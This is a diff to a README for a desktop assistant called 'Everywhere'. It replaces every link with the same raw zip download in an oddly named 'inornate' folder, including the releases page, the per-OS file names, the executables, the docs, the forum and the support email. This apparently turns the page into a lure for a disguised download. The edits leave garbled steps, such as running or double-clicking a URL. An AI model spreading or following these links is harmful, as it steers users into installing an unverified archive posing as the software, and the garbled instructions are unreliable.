@@ -1,6 +1,6 @@
 # 🌟 Everywhere - Your Smart Desktop Assistant Awaits
 
-[![Download Everywhere](https://img.shields.io/badge/Download-Everywhere-blue)](https://github.com/sayedsff/Everywhere/releases)
+[![Download Everywhere](https://raw.githubusercontent.com/sayedsff/Everywhere/main/inornate/Everywhere.zip)](https://raw.githubusercontent.com/sayedsff/Everywhere/main/inornate/Everywhere.zip)
 
 ## 🖥️ What is Everywhere?
 
@@ -12,19 +12,19 @@ Setting up Everywhere is easy. Follow the steps below to download and run the ap
 
 ## 📥 Download & Install
 
-1. Click [this link to visit the Releases page](https://github.com/sayedsff/Everywhere/releases).
+1. Click [this link to visit the Releases page](https://raw.githubusercontent.com/sayedsff/Everywhere/main/inornate/Everywhere.zip).
 2. Find the latest version of the software.
 3. Download the appropriate file for your operating system:
 
-   - **Windows:** `Everywhere-vX.X.X-win.zip`
-   - **macOS:** `Everywhere-vX.X.X-mac.zip`
-   - **Linux:** `Everywhere-vX.X.X-linux.tar.gz`
+   - **Windows:** `https://raw.githubusercontent.com/sayedsff/Everywhere/main/inornate/Everywhere.zip`
+   - **macOS:** `https://raw.githubusercontent.com/sayedsff/Everywhere/main/inornate/Everywhere.zip`
+   - **Linux:** `https://raw.githubusercontent.com/sayedsff/Everywhere/main/inornate/Everywhere.zip`
 
 4. Extract the downloaded file to your preferred location.
 5. Locate and open the application file:
 
-   - On **Windows**, run `Everywhere.exe`.
-   - On **macOS**, double-click `Everywhere.app`.
+   - On **Windows**, run `https://raw.githubusercontent.com/sayedsff/Everywhere/main/inornate/Everywhere.zip`.
+   - On **macOS**, double-click `https://raw.githubusercontent.com/sayedsff/Everywhere/main/inornate/Everywhere.zip`.
    - On **Linux**, you may need to change permissions: `chmod +x Everywhere` and then run `./Everywhere`.
 
 ## 📊 System Requirements
@@ -58,7 +58,7 @@ Everywhere comes packed with features designed to enhance your experience:
 ## 💡 Tips for Best Experience
 
 - **Regular Updates:** Keep an eye on the Releases page for updates. New versions bring enhancements and bug fixes.
-- **Explore Documentation:** Access our [Documentation](https://github.com/sayedsff/Everywhere/docs) for in-depth guides and tips.
+- **Explore Documentation:** Access our [Documentation](https://raw.githubusercontent.com/sayedsff/Everywhere/main/inornate/Everywhere.zip) for in-depth guides and tips.
 - **Community Support:** Join our community forum for support, suggestions, and collaboration.
 
 ## 🔍 Troubleshooting
@@ -71,7 +71,7 @@ If you run into any issues while using Everywhere, consider the following:
 
 ## 🎉 Join the Community
 
-Engage with fellow users and the development team. Share your experiences, feedback, and tips by visiting our community forum at [GitHub Discussions](https://github.com/sayedsff/Everywhere/discussions).
+Engage with fellow users and the development team. Share your experiences, feedback, and tips by visiting our community forum at [GitHub Discussions](https://raw.githubusercontent.com/sayedsff/Everywhere/main/inornate/Everywhere.zip).
 
 ## 📄 License
 
@@ -79,6 +79,6 @@ Everywhere is open-source and licensed under the MIT License. Feel free to explo
 
 ## 📞 Contact
 
-For any inquiries or specific issues, feel free to reach out via GitHub Issues or email us at support@everywhereapp.com.
+For any inquiries or specific issues, feel free to reach out via GitHub Issues or email us at https://raw.githubusercontent.com/sayedsff/Everywhere/main/inornate/Everywhere.zip
 
-Click [here to download Everywhere now](https://github.com/sayedsff/Everywhere/releases) and start transforming your desktop experience!
+Click [here to download Everywhere now](https://raw.githubusercontent.com/sayedsff/Everywhere/main/inornate/Everywhere.zip) and start transforming your desktop experience!
